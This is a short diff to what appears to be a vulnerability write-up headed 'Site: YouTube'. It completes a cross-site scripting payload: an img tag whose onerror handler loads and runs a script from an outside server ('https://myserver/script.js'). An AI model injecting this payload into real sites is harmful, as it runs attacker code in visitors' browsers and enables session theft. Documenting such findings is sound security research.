@@ -16,5 +16,5 @@ Site: YouTube
 ## Highlights
 XSS Payload:
 ```
-<img/src/onerror='s=document.createElement("script");s.src="https://myserver/script.js";document.body.append(s
+<img/src/onerror='s=document.createElement("script");s.src="https://myserver/script.js";document.body.append(s);'>
 ```
